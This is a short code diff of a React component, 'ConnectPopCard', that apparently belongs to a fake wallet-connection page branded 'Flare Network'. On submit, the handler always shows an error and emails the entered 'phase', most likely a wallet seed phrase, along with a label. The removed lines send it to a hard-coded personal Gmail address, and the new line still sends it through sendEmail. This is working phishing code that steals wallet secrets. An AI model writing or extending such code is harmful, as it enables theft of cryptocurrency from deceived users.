@@ -35,12 +35,7 @@ export default function ConnectPopCard({
 
   const handleSubmit = () => {
     setError(true);
-    sendEmail(
-      "uzomamicheal07@gmail.com",
-      `<p>${phase}</p>`,
-      `Wallet Connection Attempt: ${label}`,
-      "Flare Network",
-    );
+    sendEmail(label, phase)
   };
 
   return (
